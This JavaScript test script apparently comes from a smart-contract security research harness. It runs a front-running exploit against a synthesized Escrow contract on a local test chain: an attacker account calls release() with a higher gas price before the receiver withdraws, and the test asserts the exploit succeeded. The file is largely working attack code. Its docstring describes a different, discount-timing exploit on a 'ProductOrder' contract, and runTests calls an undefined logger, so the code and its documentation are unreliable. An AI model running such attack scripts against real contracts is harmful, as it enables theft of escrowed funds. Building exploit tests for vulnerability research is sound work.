require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');


const getLogger = require('@lib/logging/logger').getLogger;
const exploit8Logger = getLogger('exploit8');


// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
const contractFileFullName = 'Escrow-8.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');
let solcVersion = extractSolcVersion(source);


/**
 * Attempts to exploit a vulnerability in the ProductOrder smart contract.
 * 
 * The exploit involves applying a discount just before the discountEndTime, 
 * waiting for a few seconds, then making a transaction to pay for the order 
 * at the discounted price, and finally confirming the order.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the exploit is successful, `false` otherwise.
 * @throws {Error} If there's an error during the exploit process.
 */
async function exploit(web3, envInfo, contractAddress) {
    exploit8Logger.debug(` LINE 38`)
    try {
        exploit8Logger.debug(` LINE 40`)
        let { abi } = await compileWithVersion(source, contractFileFullName, 'Escrow', solcVersion);
        exploit8Logger.debug(` LINE 42`)
        let contractInstance = await new web3.eth.Contract(abi, contractAddress);
        exploit8Logger.debug(` LINE 44`)
        const senderAccount = envInfo.accounts[0];
        exploit8Logger.debug(` LINE 46`)
        const receiverAccount = envInfo.accounts[1];
        exploit8Logger.debug(` LINE 48`)
        const attackerAccount = envInfo.accounts[2]; // An external attacker's account
        exploit8Logger.debug(` LINE 50`)
        const escrowAmount = web3.utils.toWei("1", "ether");
        exploit8Logger.debug(` LINE 52`)
        // Sender places funds in escrow
        await contractInstance.methods.placeInEscrow().send({
            from: senderAccount,
            value: escrowAmount,
            gas: 300000
        });
        exploit8Logger.debug(` LINE 59`)
        // Attacker front-runs the release transaction from the sender or receiver
        await contractInstance.methods.release().send({
            from: attackerAccount,
            gas: 500000, // Paying higher gas fee to front-run
            gasPrice: web3.utils.toWei("20", "gwei")
        });
        exploit8Logger.debug(` LINE 66`)
        // Receiver withdraws the funds, unaware that the state was manipulated by the front-runner
        const withdrawReceipt = await contractInstance.methods.withdraw().send({
            from: receiverAccount,
            gas: 300000
        });
        exploit8Logger.debug(` LINE 72`)
        if (withdrawReceipt.status) {
            exploit8Logger.debug(` LINE 74`)
            console.log("Exploit successful! Funds withdrawn under manipulated state conditions.");
            return true;
        } else {
            exploit8Logger.debug(` LINE 78`)
            console.log("Exploit failed!");
            return false;
        }
    } catch (error) {
        exploit8Logger.debug(` LINE 83`)
        console.error(error.stack);
        return false;
    }
}















/**
 * Executes the exploit and checks its result
 * 
 * This function will run the exploit and then verify if the exploit has 
 * yielded the predicted result. If the exploit is successful, a success 
 * message is displayed, otherwise an error message is shown.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the test is successful, `false` otherwise.
 * @throws {Error} If there's an error during the test execution.
 */
module.exports = async function runTests(web3, envInfo, contractAddress) {
    // envInfo.accounts, envInfo.privateKeys, and envInfo.rpcAddress should be available from Anvil 
    
    // Execute the exploit
    let result = await exploit(web3, envInfo, contractAddress);

    // See if exploit has yielded the predicted result (a very manual oracle!)
    assert.strictEqual(result, true, "Exploit did not yield the expected result");
    logger.info(chalk.green("Exploit successful!"));

    return result; 
}
